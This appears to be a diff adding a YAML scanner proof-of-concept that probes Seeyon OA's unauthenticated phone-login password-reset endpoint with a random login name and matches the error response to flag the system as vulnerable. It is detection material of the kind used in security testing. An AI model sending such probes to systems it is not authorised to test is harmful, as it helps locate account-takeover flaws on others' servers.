@@ -1,0 +1,27 @@
+name: yaml-poc-seeyon-seeyon_oa-unsafe_account-CT-868971
+binding: 2965abf9-2f8d-46b0-9577-373c9d960a8c
+detail:
+    author: lianjian.chen
+    vulnerability:
+        id: 6eec0895-432a-471a-9f70-ceb3cc9bb6ff
+        level: high
+    warning: Harmless
+transport: http
+set:
+    s1: randomLowercase(8)
+rules:
+    r0:
+        request:
+            cache: true
+            method: POST
+            path: /seeyon/rest/phoneLogin/phoneCode/resetPassword
+            headers:
+                Content-Type: application/json
+            body: '{"loginName":"{{s1}}"}'
+            follow_redirects: false
+        expression: |-
+            response.status == 500
+            && response.body_string.contains('"success" : false,')
+            && response.body_string.contains('"message" : null')
+            && !response.body_string.contains('·Ç·¨²Ù×÷')
+expression: r0()
